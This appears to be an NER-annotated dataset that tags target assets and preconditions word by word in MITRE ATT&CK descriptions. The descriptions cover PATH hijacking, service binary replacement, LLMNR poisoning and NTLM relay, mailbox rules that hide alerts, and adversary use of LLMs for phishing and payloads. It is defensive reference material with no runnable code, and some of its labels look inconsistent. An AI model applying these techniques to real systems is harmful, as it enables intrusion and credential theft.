For O
example O
, O
on O
Windows O
if O
an O
adversary O
places O
a O
malicious O
program B-TARGET_ASSET
named O
""net.exe"" O
in O
`C:\example O
path` O
, O
which O
by O
default B-PRECON
precedes I-PRECON
`C:\Windows\system32\net.exe` O
in O
the O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
, O
when O
""net"" O
is O
executed O
from O
the O
command-line O
the O
`C:\example O
path` O
will O
be O
called O
instead O
of O
the O
system's O
legitimate O
executable B-TARGET_ASSET
at O
`C:\Windows\system32\net.exe` O
. O 


Some O
methods O
of O
executing O
a O
program B-TARGET_ASSET
rely O
on O
the O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
to O
determine O
the O
locations O
that O
are O
searched O
when O
the O
path O
for O
the O
program B-TARGET_ASSET
is O
not O
given O
, O
such O
as O
executing O
programs B-TARGET_ASSET
from O
a O
[Command B-TARGET_ASSET
and I-TARGET_ASSET
Scripting I-TARGET_ASSET
Interpreter](https://attack.mitre.org/techniques/T1059) I-TARGET_ASSET
. O 

(Citation: O
ExpressVPN O
PATH O
env O
Windows O
2021) O

Adversaries O
may O
also O
directly O
modify O
the O
$PATH B-TARGET_ASSET
variable I-TARGET_ASSET
specifying O
the O
directories O
to O
be O
searched O
. O 


An O
adversary O
can O
modify O
the O
`$PATH` B-TARGET_ASSET
variable I-TARGET_ASSET
to O
point O
to O
a O
directory O
they O
have O
write O
access O
. O 


When O
a O
program B-TARGET_ASSET
using O
the O
$PATH B-TARGET_ASSET
variable I-TARGET_ASSET
is O
called O
, O
the O
OS B-TARGET_ASSET
searches O
the O
specified O
directory O
and O
executes O
the O
malicious O
binary B-TARGET_ASSET
. O 


On O
macOS O
, O
this O
can O
also O
be O
performed O
through O
modifying O
the O
$HOME B-TARGET_ASSET
variable I-TARGET_ASSET
. O 


These O
variables B-TARGET_ASSET
can O
be O
modified O
using O
the O
command-line O
, O
launchctl O
, O
[Unix O
Shell O
Configuration O
Modification](https://attack.mitre.org/techniques/T1546/004) O
, O
or O
modifying O
the O
`/etc/paths.d` O
folder O
contents O
. O 


(Citation: O
uptycs O
Fake O
POC O
linux O
malware O
2023)(Citation: O
nixCraft O
macOS O
PATH O
variables)(Citation: O
Elastic O
Rules O
macOS O
launchctl O
2022) O

Adversaries O
may O
leverage O
the O
SharePoint B-TARGET_ASSET
repository I-TARGET_ASSET
as O
a O
source O
to O
mine O
valuable O
information O
. O 


SharePoint B-TARGET_ASSET
will O
often O
contain O
useful O
information O
for O
an O
adversary O
to O
learn O
about O
the O
structure O
and O
functionality O
of O
the O
internal O
network B-TARGET_ASSET
and O
systems B-TARGET_ASSET
. O 


For O
example O
, O
the O
following O
is O
a O
list O
of O
example O
information O
that O
may O
hold O
potential O
value O
to O
an O
adversary O
and O
may O
also O
be O
found O
on O
SharePoint B-TARGET_ASSET
: O

* O
Policies O
, O
procedures O
, O
and O
standards O
* O
Physical O
/ O
logical O
network B-TARGET_ASSET
diagrams I-TARGET_ASSET
* O
System B-TARGET_ASSET
architecture I-TARGET_ASSET
diagrams I-TARGET_ASSET
* O
Technical O
system B-TARGET_ASSET
documentation I-TARGET_ASSET
* O
Testing O
/ O
development O
credentials B-TARGET_ASSET
(i.e., O
[Unsecured B-TARGET_ASSET
Credentials](https://attack.mitre.org/techniques/T1552) I-TARGET_ASSET
) O
* O
Work O
/ O
project O
schedules O
* O
Source O
code O
snippets O
* O
Links O
to O
network B-TARGET_ASSET
shares I-TARGET_ASSET
and O
other O
internal O
resources O

Adversaries O
may O
directly O
access O
a O
volume B-TARGET_ASSET
to O
bypass O
file B-TARGET_ASSET
access I-TARGET_ASSET
controls I-TARGET_ASSET
and O
file B-TARGET_ASSET
system I-TARGET_ASSET
monitoring I-TARGET_ASSET
. O 


Windows O
allows O
programs O
to O
have O
direct B-PRECON
access I-PRECON
to O
logical B-TARGET_ASSET
volumes I-TARGET_ASSET
. O 

Programs O
with O
direct B-PRECON
access I-PRECON
may O
read O
and O
write O
files B-TARGET_ASSET
directly O
from O
the O
drive B-TARGET_ASSET
by O
analyzing O
file B-TARGET_ASSET
system I-TARGET_ASSET
data I-TARGET_ASSET
structures I-TARGET_ASSET
. O 


This O
technique O
may O
bypass O
Windows O
file B-TARGET_ASSET
access I-TARGET_ASSET
controls I-TARGET_ASSET
as O
well O
as O
file B-TARGET_ASSET
system I-TARGET_ASSET
monitoring I-TARGET_ASSET
tools I-TARGET_ASSET
. O 

(Citation: O
Hakobyan O
2009) O

Utilities B-TARGET_ASSET
, O
such O
as O
`NinjaCopy` O
, O
exist O
to O
perform O
these O
actions O
in O
PowerShell B-TARGET_ASSET
. O 

(Citation: O
Github O
PowerSploit O
Ninjacopy) O
Adversaries O
may O
also O
use O
built-in O
or O
third-party O
utilities B-TARGET_ASSET
(such O
as O
`vssadmin` O
, O
`wbadmin` O
, O
and O
[esentutl](https://attack.mitre.org/software/S0404) B-TARGET_ASSET
) O
to O
create O
shadow B-TARGET_ASSET
copies I-TARGET_ASSET
or O
backups B-TARGET_ASSET
of O
data B-TARGET_ASSET
from O
system B-TARGET_ASSET
volumes I-TARGET_ASSET
. O 

(Citation: O
LOLBAS O
Esentutl) O

Processes O
may O
automatically O
execute O
specific O
binaries B-TARGET_ASSET
as O
part O
of O
their O
functionality O
or O
to O
perform O
other O
actions O
. O 


If O
the O
permissions O
on O
the O
file B-TARGET_ASSET
system I-TARGET_ASSET
directory I-TARGET_ASSET
containing O
a O
target O
binary B-TARGET_ASSET
, O
or O
permissions O
on O
the O
binary B-TARGET_ASSET
itself O
, O
are O
improperly B-PRECON
set I-PRECON
, O
then O
the O
target O
binary B-TARGET_ASSET
may O
be O
overwritten O
with O
another O
binary B-TARGET_ASSET
using O
user-level O
permissions O
and O
executed O
by O
the O
original O
process B-TARGET_ASSET
. O 


If O
the O
original O
process B-TARGET_ASSET
and O
thread O
are O
running B-PRECON
under I-PRECON
a I-PRECON
higher I-PRECON
permissions I-PRECON
level I-PRECON
, O
then O
the O
replaced O
binary B-TARGET_ASSET
will O
also O
execute O
under O
higher-level O
permissions O
, O
which O
could O
include O
SYSTEM O
. O 


Adversaries O
may O
use O
this O
technique O
to O
replace O
legitimate O
binaries B-TARGET_ASSET
with O
malicious O
ones O
as O
a O
means O
of O
executing O
code O
at O
a O
higher O
permissions O
level O
. O 


If O
the O
executing O
process B-TARGET_ASSET
is O
set B-PRECON
to I-PRECON
run I-PRECON
at I-PRECON
a I-PRECON
specific I-PRECON
time I-PRECON
or O
during O
a O
certain O
event O
(e.g., O
system O
bootup) O
then O
this O
technique O
can O
also O
be O
used O
for O
persistence O
. O 


### O
Services O
Manipulation O
of O
Windows O
service B-TARGET_ASSET
binaries I-TARGET_ASSET
is O
one O
variation O
of O
this O
technique O
. O 


Adversaries O
may O
replace O
a O
legitimate O
service B-TARGET_ASSET
executable I-TARGET_ASSET
with O
their O
own O
executable B-TARGET_ASSET
to O
gain O
persistence O
and/or O
privilege O
escalation O
to O
the O
account O
context O
the O
service B-TARGET_ASSET
is O
set B-PRECON
to I-PRECON
execute I-PRECON
under I-PRECON
(local/domain O
account, O
SYSTEM, O
LocalService, O
or O
NetworkService) O
. O 


Once O
the O
service B-TARGET_ASSET
is O
started O
, O
either O
directly O
by O
the O
user O
(if O
appropriate O
access O
is O
available) O
or O
through O
some O
other O
means O
, O
such O
as O
a O
system O
restart O
if O
the O
service B-TARGET_ASSET
starts B-PRECON
on I-PRECON
bootup I-PRECON
, O
the O
replaced O
executable B-TARGET_ASSET
will O
run O
instead O
of O
the O
original O
service B-TARGET_ASSET
executable I-TARGET_ASSET
. O 


### O
Executable O
Installers O
Another O
variation O
of O
this O
technique O
can O
be O
performed O
by O
taking O
advantage O
of O
a O
weakness O
that O
is O
common O
in O
executable B-TARGET_ASSET
, O
self-extracting B-TARGET_ASSET
installers I-TARGET_ASSET
. O 


During O
the O
installation O
process O
, O
it O
is O
common O
for O
installers B-TARGET_ASSET
to O
use O
a O
subdirectory O
within O
the O
<code>%TEMP%</code> O
directory O
to O
unpack O
binaries B-TARGET_ASSET
such O
as O
DLLs B-TARGET_ASSET
, O
EXEs B-TARGET_ASSET
, O
or O
other O
payloads B-TARGET_ASSET
. O 


When O
installers B-TARGET_ASSET
create O
subdirectories O
and O
files O
they O
often O
do O
not O
set O
appropriate O
permissions O
to O
restrict O
write O
access O
, O
which O
allows O
for O
execution O
of O
untrusted O
code O
placed O
in O
the O
subdirectories O
or O
overwriting O
of O
binaries B-TARGET_ASSET
used O
in O
the O
installation O
process O
. O 


This O
behavior O
is O
related O
to O
and O
may O
take O
advantage O
of O
[DLL B-TARGET_ASSET
Search I-TARGET_ASSET
Order I-TARGET_ASSET
Hijacking](https://attack.mitre.org/techniques/T1038) I-TARGET_ASSET
. O 


Some O
installers B-TARGET_ASSET
may O
also O
require O
elevated B-PRECON
privileges I-PRECON
that O
will O
result O
in O
privilege O
escalation O
when O
executing O
adversary O
controlled O
code O
. O 


This O
behavior O
is O
related O
to O
[Bypass O
User O
Account O
Control](https://attack.mitre.org/techniques/T1088) O
. O 

Several O
examples O
of O
this O
weakness O
in O
existing O
common O
installers B-TARGET_ASSET
have O
been O
reported O
to O
software O
vendors O
. O 

(Citation: O
Mozilla O
Firefox O
Installer O
DLL O
Hijack) O
(Citation: O
Seclists O
Kanthak O
7zip O
Installer) O

Adversaries O
may O
obtain O
access O
to O
generative B-TARGET_ASSET
artificial I-TARGET_ASSET
intelligence I-TARGET_ASSET
tools I-TARGET_ASSET
, O
such O
as O
large B-TARGET_ASSET
language I-TARGET_ASSET
models I-TARGET_ASSET
( I-TARGET_ASSET
LLMs I-TARGET_ASSET
) I-TARGET_ASSET
, O
to O
aid O
various O
techniques O
during O
targeting O
. O 


These O
tools B-TARGET_ASSET
may O
be O
used O
to O
inform O
, O
bolster O
, O
and O
enable O
a O
variety O
of O
malicious O
tasks O
, O
including O
conducting O
[Reconnaissance](https://attack.mitre.org/tactics/TA0043) O
, O
creating O
basic O
scripts B-TARGET_ASSET
, O
assisting O
social O
engineering O
, O
and O
even O
developing O
payloads B-TARGET_ASSET
. O 

(Citation: O
MSFT-AI) O

For O
example O
, O
by O
utilizing O
a O
publicly B-PRECON
available I-PRECON
LLM B-TARGET_ASSET
an O
adversary O
is O
essentially O
outsourcing O
or O
automating O
certain O
tasks O
to O
the O
tool B-TARGET_ASSET
. O 


Using O
AI O
, O
the O
adversary O
may O
draft O
and O
generate O
content O
in O
a O
variety O
of O
written O
languages O
to O
be O
used O
in O
[Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598) O
campaigns O
. O 


The O
same O
publicly B-PRECON
available I-PRECON
tool B-TARGET_ASSET
may O
further O
enable O
vulnerability O
or O
other O
offensive O
research O
supporting O
[Develop O
Capabilities](https://attack.mitre.org/techniques/T1587) O
. O 


AI B-TARGET_ASSET
tools I-TARGET_ASSET
may O
also O
automate O
technical O
tasks O
by O
generating O
, O
refining O
, O
or O
otherwise O
enhancing O
(e.g., O
[Obfuscated O
Files O
or O
Information](https://attack.mitre.org/techniques/T1027)) O
malicious O
scripts B-TARGET_ASSET
and O
payloads B-TARGET_ASSET
. O 

(Citation: O
OpenAI-CTI) O
Finally O
, O
AI-generated O
text O
, O
images O
, O
audio O
, O
and O
video O
may O
be O
used O
for O
fraud O
, O
[Impersonation](https://attack.mitre.org/techniques/T1656) O
, O
and O
other O
malicious O
activities O
. O 

(Citation: O
Google-Vishing24)(Citation: O
IC3-AI24)(Citation: O
WSJ-Vishing-AI24) O

Adversaries O
may O
attempt O
to O
modify O
hierarchical O
structures O
in O
infrastructure-as-a-service B-TARGET_ASSET
( I-TARGET_ASSET
IaaS I-TARGET_ASSET
) I-TARGET_ASSET
environments I-TARGET_ASSET
in O
order O
to O
evade O
defenses O
. O 


IaaS B-TARGET_ASSET
environments I-TARGET_ASSET
often O
group O
resources O
into O
a O
hierarchy O
, O
enabling O
improved O
resource O
management O
and O
application O
of O
policies O
to O
relevant O
groups O
. O 


Hierarchical O
structures O
differ O
among O
cloud O
providers O
. O 

For O
example O
, O
in O
AWS B-TARGET_ASSET
environments I-TARGET_ASSET
, O
multiple O
accounts B-TARGET_ASSET
can O
be O
grouped O
under O
a O
single O
organization B-TARGET_ASSET
, O
while O
in O
Azure B-TARGET_ASSET
environments I-TARGET_ASSET
, O
multiple O
subscriptions B-TARGET_ASSET
can O
be O
grouped O
under O
a O
single O
management B-TARGET_ASSET
group I-TARGET_ASSET
. O 

(Citation: O
AWS O
Organizations)(Citation: O
Microsoft O
Azure O
Resources) O

Adversaries O
may O
add O
, O
delete O
, O
or O
otherwise O
modify O
resource B-TARGET_ASSET
groups I-TARGET_ASSET
within O
an O
IaaS B-TARGET_ASSET
hierarchy I-TARGET_ASSET
. O 


For O
example O
, O
in O
Azure B-TARGET_ASSET
environments I-TARGET_ASSET
, O
an O
adversary O
who O
has O
gained O
access O
to O
a O
Global O
Administrator O
account B-TARGET_ASSET
may O
create O
new O
subscriptions B-TARGET_ASSET
in O
which O
to O
deploy O
resources O
. O 


They O
may O
also O
engage O
in O
subscription O
hijacking O
by O
transferring O
an O
existing O
pay-as-you-go O
subscription B-TARGET_ASSET
from O
a O
victim O
tenant O
to O
an O
adversary-controlled O
tenant O
. O 


This O
will O
allow O
the O
adversary O
to O
use O
the O
victim’s O
compute O
resources O
without O
generating O
logs B-TARGET_ASSET
on O
the O
victim O
tenant O
. O 

(Citation: O
Microsoft O
Peach O
Sandstorm O
2023)(Citation: O
Microsoft O
Subscription O
Hijacking O
2022) O

In O
AWS B-TARGET_ASSET
environments I-TARGET_ASSET
, O
adversaries O
with O
appropriate O
permissions O
in O
a O
given O
account B-TARGET_ASSET
may O
call O
the O
`LeaveOrganization` B-TARGET_ASSET
API I-TARGET_ASSET
, O
causing O
the O
account B-TARGET_ASSET
to O
be O
severed O
from O
the O
AWS B-TARGET_ASSET
Organization I-TARGET_ASSET
to O
which O
it O
was O
tied O
and O
removing O
any O
Service B-TARGET_ASSET
Control I-TARGET_ASSET
Policies I-TARGET_ASSET
, O
guardrails O
, O
or O
restrictions O
imposed O
upon O
it O
by O
its O
former O
Organization B-TARGET_ASSET
. O 


Alternatively O
, O
adversaries O
may O
call O
the O
`CreateAccount` B-TARGET_ASSET
API I-TARGET_ASSET
in O
order O
to O
create O
a O
new O
account B-TARGET_ASSET
within O
an O
AWS B-TARGET_ASSET
Organization I-TARGET_ASSET
. O 


This O
account B-TARGET_ASSET
will O
use O
the O
same O
payment O
methods O
registered O
to O
the O
payment O
account O
but O
may O
not O
be O
subject O
to O
existing O
detections O
or O
Service B-TARGET_ASSET
Control I-TARGET_ASSET
Policies I-TARGET_ASSET
. O 

(Citation: O
AWS O
RE:Inforce O
Threat O
Detection O
2024) O

Adversaries O
may O
use O
email B-TARGET_ASSET
rules I-TARGET_ASSET
to O
hide O
inbound O
emails B-TARGET_ASSET
in O
a O
compromised O
user's O
mailbox B-TARGET_ASSET
. O 


Many O
email B-TARGET_ASSET
clients I-TARGET_ASSET
allow O
users O
to O
create O
inbox B-TARGET_ASSET
rules I-TARGET_ASSET
for O
various O
email O
functions O
, O
including O
moving O
emails B-TARGET_ASSET
to O
other O
folders O
, O
marking O
emails B-TARGET_ASSET
as O
read O
, O
or O
deleting O
emails B-TARGET_ASSET
. O 


Rules B-TARGET_ASSET
may O
be O
created O
or O
modified O
within O
email B-TARGET_ASSET
clients I-TARGET_ASSET
or O
through O
external O
features O
such O
as O
the O
<code>New-InboxRule</code> O
or O
<code>Set-InboxRule</code> O
[PowerShell](https://attack.mitre.org/techniques/T1059/001) B-TARGET_ASSET
cmdlets I-TARGET_ASSET
on O
Windows O
systems B-TARGET_ASSET
. O 

(Citation: O
Microsoft O
Inbox O
Rules)(Citation: O
MacOS O
Email O
Rules)(Citation: O
Microsoft O
New-InboxRule)(Citation: O
Microsoft O
Set-InboxRule) O

Adversaries O
may O
utilize O
email B-TARGET_ASSET
rules I-TARGET_ASSET
within O
a O
compromised O
user's O
mailbox B-TARGET_ASSET
to O
delete O
and/or O
move O
emails B-TARGET_ASSET
to O
less O
noticeable O
folders O
. O 


Adversaries O
may O
do O
this O
to O
hide O
security O
alerts B-TARGET_ASSET
, O
C2 O
communication B-TARGET_ASSET
, O
or O
responses O
to O
[Internal O
Spearphishing](https://attack.mitre.org/techniques/T1534) O
emails B-TARGET_ASSET
sent O
from O
the O
compromised O
account B-TARGET_ASSET
. O 


Any O
user O
or O
administrator O
within O
the O
organization O
(or O
adversary O
with O
valid O
credentials) O
may O
be O
able O
to O
create O
rules B-TARGET_ASSET
to O
automatically O
move O
or O
delete O
emails B-TARGET_ASSET
. O 


These O
rules B-TARGET_ASSET
can O
be O
abused O
to O
impair/delay O
detection O
had O
the O
email B-TARGET_ASSET
content I-TARGET_ASSET
been O
immediately O
seen O
by O
a O
user O
or O
defender O
. O 


Malicious O
rules B-TARGET_ASSET
commonly O
filter O
out O
emails B-TARGET_ASSET
based O
on O
key O
words O
(such O
as O
<code>malware</code> O
, O
<code>suspicious</code> O
, O
<code>phish</code> O
, O
and O
<code>hack</code>) O
found O
in O
message B-TARGET_ASSET
bodies I-TARGET_ASSET
and O
subject B-TARGET_ASSET
lines I-TARGET_ASSET
. O 

(Citation: O
Microsoft O
Cloud O
App O
Security) O

In O
some O
environments O
, O
administrators O
may O
be O
able O
to O
enable O
email B-TARGET_ASSET
rules I-TARGET_ASSET
that O
operate B-PRECON
organization-wide I-PRECON
rather O
than O
on O
individual O
inboxes B-TARGET_ASSET
. O 


For O
example O
, O
Microsoft B-TARGET_ASSET
Exchange I-TARGET_ASSET
supports O
transport B-TARGET_ASSET
rules I-TARGET_ASSET
that O
evaluate O
all O
mail B-TARGET_ASSET
an O
organization O
receives O
against O
user-specified O
conditions O
, O
then O
performs O
a O
user-specified O
action O
on O
mail B-TARGET_ASSET
that O
adheres O
to O
those O
conditions O
. O 


(Citation: O
Microsoft O
Mail O
Flow O
Rules O
2023) O
Adversaries O
that O
abuse O
such O
features O
may O
be O
able O
to O
automatically O
modify O
or O
delete O
all O
emails B-TARGET_ASSET
related O
to O
specific O
topics O
(such O
as O
internal O
security O
incident O
notifications) O
. O 


An O
adversary O
may O
deface O
systems B-TARGET_ASSET
external B-PRECON
to I-PRECON
an I-PRECON
organization I-PRECON
in O
an O
attempt O
to O
deliver O
messaging O
, O
intimidate O
, O
or O
otherwise O
mislead O
an O
organization O
or O
users O
. O 


[External O
Defacement](https://attack.mitre.org/techniques/T1491/002) O
may O
ultimately O
cause O
users O
to O
distrust O
the O
systems B-TARGET_ASSET
and O
to O
question/discredit O
the O
system’s B-TARGET_ASSET
integrity I-TARGET_ASSET
. O 


Externally-facing O
websites B-TARGET_ASSET
are O
a O
common O
victim O
of O
defacement O
; O
often O
targeted O
by O
adversary O
and O
hacktivist O
groups O
in O
order O
to O
push O
a O
political O
message O
or O
spread O
propaganda O
. O 


(Citation: O
FireEye O
Cyber O
Threats O
to O
Media O
Industries)(Citation: O
Kevin O
Mandia O
Statement O
to O
US O
Senate O
Committee O
on O
Intelligence)(Citation: O
Anonymous O
Hackers O
Deface O
Russian O
Govt O
Site) O
[External O
Defacement](https://attack.mitre.org/techniques/T1491/002) O
may O
be O
used O
as O
a O
catalyst O
to O
trigger O
events O
, O
or O
as O
a O
response O
to O
actions O
taken O
by O
an O
organization O
or O
government O
. O 


Similarly O
, O
website B-TARGET_ASSET
defacement I-TARGET_ASSET
may O
also O
be O
used O
as O
setup O
, O
or O
a O
precursor O
, O
for O
future O
attacks O
such O
as O
[Drive-by B-TARGET_ASSET
Compromise](https://attack.mitre.org/techniques/T1189) I-TARGET_ASSET
. O 

(Citation: O
Trend O
Micro O
Deep O
Dive O
Into O
Defacement) O

Adversaries O
may O
encrypt O
or O
encode O
files B-TARGET_ASSET
to O
obfuscate O
strings O
, O
bytes O
, O
and O
other O
specific O
patterns O
to O
impede O
detection O
. O 


Encrypting O
and/or O
encoding O
file B-TARGET_ASSET
content I-TARGET_ASSET
aims O
to O
conceal O
malicious O
artifacts O
within O
a O
file B-TARGET_ASSET
used O
in O
an O
intrusion O
. O 


Many O
other O
techniques O
, O
such O
as O
[Software B-TARGET_ASSET
Packing](https://attack.mitre.org/techniques/T1027/002) I-TARGET_ASSET
, O
[Steganography](https://attack.mitre.org/techniques/T1027/003) O
, O
and O
[Embedded B-TARGET_ASSET
Payloads](https://attack.mitre.org/techniques/T1027/009) I-TARGET_ASSET
, O
share O
this O
same O
broad O
objective O
. O 


Encrypting O
and/or O
encoding O
files B-TARGET_ASSET
could O
lead O
to O
a O
lapse O
in O
detection O
of O
static O
signatures O
, O
only O
for O
this O
malicious O
content O
to O
be O
revealed O
(i.e., O
[Deobfuscate/Decode O
Files O
or O
Information](https://attack.mitre.org/techniques/T1140)) O
at O
the O
time O
of O
execution/use O
. O 


This O
type O
of O
file O
obfuscation O
can O
be O
applied O
to O
many O
file B-TARGET_ASSET
artifacts I-TARGET_ASSET
present O
on O
victim O
hosts B-TARGET_ASSET
, O
such O
as O
malware B-TARGET_ASSET
log/configuration I-TARGET_ASSET
and O
payload B-TARGET_ASSET
files I-TARGET_ASSET
. O 

(Citation: O
File O
obfuscation) O
Files B-TARGET_ASSET
can O
be O
encrypted B-PRECON
with I-PRECON
a I-PRECON
hardcoded I-PRECON
or I-PRECON
user-supplied I-PRECON
key I-PRECON
, O
as O
well O
as O
otherwise O
obfuscated O
using O
standard O
encoding O
schemes O
such O
as O
Base64 O
. O 


The O
entire O
content O
of O
a O
file B-TARGET_ASSET
may O
be O
obfuscated O
, O
or O
just O
specific O
functions O
or O
values O
(such O
as O
C2 O
addresses) O
. O 


Encryption O
and O
encoding O
may O
also O
be O
applied O
in O
redundant O
layers O
for O
additional O
protection O
. O 


For O
example O
, O
adversaries O
may O
abuse O
password-protected B-PRECON
Word B-TARGET_ASSET
documents I-TARGET_ASSET
or O
self-extracting B-TARGET_ASSET
( I-TARGET_ASSET
SFX I-TARGET_ASSET
) I-TARGET_ASSET
archives I-TARGET_ASSET
as O
a O
method O
of O
encrypting/encoding O
a O
file B-TARGET_ASSET
such O
as O
a O
[Phishing](https://attack.mitre.org/techniques/T1566) O
payload B-TARGET_ASSET
. O 


These O
files B-TARGET_ASSET
typically O
function O
by O
attaching O
the O
intended O
archived O
content O
to O
a O
decompressor B-TARGET_ASSET
stub I-TARGET_ASSET
that O
is O
executed O
when O
the O
file B-TARGET_ASSET
is O
invoked O
(e.g., O
[User O
Execution](https://attack.mitre.org/techniques/T1204)) O
. O 

(Citation: O
SFX O
- O
Encrypted/Encoded O
File) O

Adversaries O
may O
also O
abuse O
file-specific O
as O
well O
as O
custom O
encoding O
schemes O
. O 


For O
example O
, O
Byte O
Order O
Mark O
(BOM) O
headers B-TARGET_ASSET
in O
text B-TARGET_ASSET
files I-TARGET_ASSET
may O
be O
abused O
to O
manipulate O
and O
obfuscate O
file B-TARGET_ASSET
content I-TARGET_ASSET
until O
[Command B-TARGET_ASSET
and I-TARGET_ASSET
Scripting I-TARGET_ASSET
Interpreter](https://attack.mitre.org/techniques/T1059) I-TARGET_ASSET
execution O
. O 


Link-Local B-TARGET_ASSET
Multicast I-TARGET_ASSET
Name I-TARGET_ASSET
Resolution I-TARGET_ASSET
( I-TARGET_ASSET
LLMNR I-TARGET_ASSET
) I-TARGET_ASSET
and O
NetBIOS B-TARGET_ASSET
Name I-TARGET_ASSET
Service I-TARGET_ASSET
( I-TARGET_ASSET
NBT-NS I-TARGET_ASSET
) I-TARGET_ASSET
are O
Microsoft O
Windows O
components O
that O
serve O
as O
alternate O
methods O
of O
host O
identification O
. O 


LLMNR B-TARGET_ASSET
is O
based O
upon O
the O
Domain B-TARGET_ASSET
Name I-TARGET_ASSET
System I-TARGET_ASSET
( I-TARGET_ASSET
DNS I-TARGET_ASSET
) I-TARGET_ASSET
format O
and O
allows O
hosts B-TARGET_ASSET
on O
the O
same O
local O
link O
to O
perform O
name O
resolution O
for O
other O
hosts B-TARGET_ASSET
. O 


NBT-NS B-TARGET_ASSET
identifies O
systems B-TARGET_ASSET
on O
a O
local O
network O
by O
their O
NetBIOS O
name O
. O 

(Citation: O
Wikipedia O
LLMNR) O
(Citation: O
TechNet O
NetBIOS) O

Adversaries O
can O
spoof O
an O
authoritative O
source O
for O
name O
resolution O
on O
a O
victim O
network B-TARGET_ASSET
by O
responding O
to O
LLMNR B-TARGET_ASSET
(UDP O
5355)/NBT-NS B-TARGET_ASSET
(UDP O
137) O
traffic O
as O
if O
they O
know O
the O
identity O
of O
the O
requested O
host B-TARGET_ASSET
, O
effectively O
poisoning O
the O
service B-TARGET_ASSET
so O
that O
the O
victims O
will O
communicate O
with O
the O
adversary O
controlled O
system B-TARGET_ASSET
. O 


If O
the O
requested O
host B-TARGET_ASSET
belongs O
to O
a O
resource O
that O
requires O
identification/authentication O
, O
the O
username O
and O
NTLMv2 B-TARGET_ASSET
hash I-TARGET_ASSET
will O
then O
be O
sent O
to O
the O
adversary O
controlled O
system B-TARGET_ASSET
. O 


The O
adversary O
can O
then O
collect O
the O
hash B-TARGET_ASSET
information I-TARGET_ASSET
sent O
over O
the O
wire O
through O
tools B-TARGET_ASSET
that O
monitor O
the O
ports B-TARGET_ASSET
for O
traffic O
or O
through O
[Network B-TARGET_ASSET
Sniffing](https://attack.mitre.org/techniques/T1040) I-TARGET_ASSET
and O
crack O
the O
hashes B-TARGET_ASSET
offline O
through O
[Brute O
Force](https://attack.mitre.org/techniques/T1110) O
to O
obtain O
the O
plaintext O
passwords B-TARGET_ASSET
. O 


In O
some O
cases O
where O
an O
adversary O
has O
access O
to O
a O
system B-TARGET_ASSET
that O
is O
in O
the O
authentication O
path O
between O
systems O
or O
when O
automated O
scans O
that O
use O
credentials B-TARGET_ASSET
attempt O
to O
authenticate O
to O
an O
adversary O
controlled O
system B-TARGET_ASSET
, O
the O
NTLMv2 B-TARGET_ASSET
hashes I-TARGET_ASSET
can O
be O
intercepted O
and O
relayed O
to O
access O
and O
execute O
code O
against O
a O
target O
system B-TARGET_ASSET
. O 


The O
relay O
step O
can O
happen O
in O
conjunction O
with O
poisoning O
but O
may O
also O
be O
independent O
of O
it O
. O 

(Citation: O
byt3bl33d3r O
NTLM O
Relaying)(Citation: O
Secure O
Ideas O
SMB O
Relay) O

Several O
tools B-TARGET_ASSET
exist O
that O
can O
be O
used O
to O
poison O
name O
services B-TARGET_ASSET
within O
local O
networks B-TARGET_ASSET
such O
as O
NBNSpoof B-TARGET_ASSET
, O
Metasploit B-TARGET_ASSET
, O
and O
[Responder](https://attack.mitre.org/software/S0174) B-TARGET_ASSET
. O 

(Citation: O
GitHub O
NBNSpoof) O
(Citation: O
Rapid7 O
LLMNR O
Spoofer) O
(Citation: O
GitHub O
Responder) O

Adversaries O
may O
gather O
the O
victim's O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
that O
can O
be O
used O
during O
targeting O
. O 

Public O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
may O
be O
allocated B-PRECON
to O
organizations O
by O
block O
, O
or O
a O
range O
of O
sequential O
addresses O
. O 


Information O
about O
assigned O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
may O
include O
a O
variety O
of O
details O
, O
such O
as O
which O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
are O
in B-PRECON
use I-PRECON
. O 


IP B-TARGET_ASSET
addresses I-TARGET_ASSET
may O
also O
enable O
an O
adversary O
to O
derive O
other O
details O
about O
a O
victim O
, O
such O
as O
organizational O
size O
, O
physical O
location(s) O
, O
Internet O
service O
provider O
, O
and O
or O
where/how O
their O
publicly-facing O
infrastructure B-TARGET_ASSET
is O
hosted O
. O 


Adversaries O
may O
gather O
this O
information O
in O
various O
ways O
, O
such O
as O
direct O
collection O
actions O
via O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595) O
or O
[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598) O
. O 


Information O
about O
assigned O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
may O
also O
be O
exposed B-PRECON
to O
adversaries O
via O
online O
or O
other O
accessible O
data O
sets O
(ex: O
[Search O
Open O
Technical O
Databases](https://attack.mitre.org/techniques/T1596)) O
. O 

(Citation: O
WHOIS)(Citation: O
DNS O
Dumpster)(Citation: O
Circl O
Passive O
DNS) O
Gathering O
this O
information O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595) O
or O
[Search O
Open O
Websites/Domains](https://attack.mitre.org/techniques/T1593)) O
, O
establishing O
operational O
resources O
(ex: O
[Acquire O
Infrastructure](https://attack.mitre.org/techniques/T1583) O
or O
[Compromise O
Infrastructure](https://attack.mitre.org/techniques/T1584)) O
, O
and/or O
initial O
access O
(ex: O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133)) O
. O 


Adversaries O
may O
attempt O
to O
cause O
a O
denial O
of O
service O
(DoS) O
by O
directly O
sending O
a O
high-volume O
of O
network O
traffic B-TARGET_ASSET
to O
a O
target O
. O 


This O
DoS O
attack O
may O
also O
reduce O
the O
availability O
and O
functionality O
of O
the O
targeted O
system(s) B-TARGET_ASSET
and O
network B-TARGET_ASSET
. O 


[Direct B-TARGET_ASSET
Network I-TARGET_ASSET
Flood](https://attack.mitre.org/techniques/T1498/001) I-TARGET_ASSET
s O
are O
when O
one O
or O
more O
systems B-TARGET_ASSET
are O
used O
to O
send O
a O
high-volume O
of O
network B-TARGET_ASSET
packets I-TARGET_ASSET
towards O
the O
targeted O
service's B-TARGET_ASSET
network I-TARGET_ASSET
. O 

